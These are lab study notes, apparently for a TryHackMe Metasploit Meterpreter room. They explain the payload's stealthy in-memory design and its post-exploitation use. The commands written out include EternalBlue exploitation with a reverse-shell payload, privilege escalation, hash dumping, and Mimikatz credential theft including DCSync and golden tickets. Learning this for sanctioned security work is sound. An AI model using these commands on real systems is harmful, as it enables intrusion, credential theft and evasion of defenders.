# 3.7 - [Metasploit: Meterpreter](https://tryhackme.com/room/metasploitmeterpreter)

## 🔍 Overview
- **Meterpreter** is an advanced, in‑memory payload that runs on the target system without writing to disk.
- Designed to evade antivirus and network detection by using **encrypted communication** (TLS) and **running only in RAM**.
- Provides a rich set of post‑exploitation tools: file system access, process manipulation, privilege escalation, password dumping, keylogging, screen capture, and more.

---

## 🧠 How Meterpreter Works

- **Runs in memory** – does not write any file to the target disk, reducing detection by signature‑based AV.
- **Encrypted communication** – uses TLS between the target and your Metasploit instance, making it harder for IDS/IPS to detect.
- **Process injection** – Meterpreter typically runs inside a legitimate Windows process (e.g., `spoolsv.exe`), making it look like normal system activity.
- **Staged vs Inline** – Meterpreter payloads come in both staged and inline (single) versions.
  - **Staged**: sends a small stager first, then downloads the full stage.
  - **Inline**: the entire payload is sent at once (larger but self‑contained).

## 🛠️ Meterpreter Versions

You can list all Meterpreter payloads using:
```bash
msfvenom --list payloads | grep meterpreter
```

Common Meterpreter families:
| Platform | Payload Examples |
|----------|------------------|
| Windows | `windows/meterpreter/reverse_tcp`, `windows/x64/meterpreter/reverse_https` |
| Linux | `linux/x86/meterpreter/reverse_tcp`, `linux/x64/meterpreter/reverse_tcp` |
| Android | `android/meterpreter/reverse_tcp` |
| PHP | `php/meterpreter/reverse_tcp` |
| Python | `python/meterpreter/reverse_tcp` |
| Java | `java/meterpreter/reverse_tcp` |

The choice depends on:
- Target OS (Windows, Linux, Android, etc.)
- Available interpreters (Python, PHP, Java)
- Network restrictions (TCP, HTTPS, IPv6)

## 🧩 Meterpreter Extensions

You can load additional functionality using the `load` command.

### Kiwi (Mimikatz) Extension
```bash
meterpreter > load kiwi
```
After loading, you get Mimikatz commands:
| Command | Description |
|---------|-------------|
| `creds_all` | Retrieve all credentials |
| `creds_msv` | Retrieve LM/NTLM hashes |
| `creds_wdigest` | Retrieve WDigest credentials |
| `lsa_dump_sam` | Dump SAM database |
| `lsa_dump_secrets` | Dump LSA secrets |
| `dcsync` | DCSync attack to get user hashes |
| `wifi_list` | List stored Wi‑Fi credentials |
| `golden_ticket_create` | Create golden Kerberos ticket |

### Python Extension
```bash
meterpreter > load python
meterpreter > python_execute "print('Hello')"
```
Allows execution of arbitrary Python code on the target.

## 📋 Practical Usage Examples

### 1. Getting a Meterpreter Session (via Exploit)
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.X.X
msf6 > set LPORT 4444
msf6 > exploit
```
- Once the exploit succeeds, a Meterpreter session opens.

### 2. Checking User and Privileges
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM   # or a lower user

meterpreter > getsystem
... attempts to escalate to SYSTEM
```

### 3. Listing Processes and Migrating
```bash
meterpreter > ps
# Find a stable process (e.g., explorer.exe, winlogon.exe) with high integrity
meterpreter > migrate 1234   # replace with target PID
```

### 4. Dumping Password Hashes
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
```

### 5. Searching for Files (e.g., flags)
```bash
meterpreter > search -f flag.txt
Found 1 result...
    c:\Users\ballen\Desktop\flag.txt
```

### 6. Uploading/Downloading Files
```bash
# Upload a local file to target
meterpreter > upload /root/tools/mimikatz.exe C:\\Windows\\Temp\\

# Download a file from target
meterpreter > download C:\\secret\\data.txt /root/
```

### 7. Getting a System Shell
```bash
meterpreter > shell
C:\Windows\system32> whoami
```

### 8. Using Kiwi to Extract Cleartext Passwords
```bash
meterpreter > load kiwi
meterpreter > creds_all
# Shows hashes and sometimes cleartext passwords (if WDigest is enabled)
```

## 🔑 Key Takeaways

- **Meterpreter** is a powerful, stealthy payload that runs **in-memory**, making it difficult to detect.
- **Encrypted communication** (TLS) protects against network monitoring.
- Offers extensive **post‑exploitation** capabilities: file system navigation, process migration, privilege escalation, credential dumping, keylogging, and more.
- Extensions like **Kiwi** (Mimikatz) and **Python** expand functionality further.
- Always run `help` to see all commands available for your specific Meterpreter version.
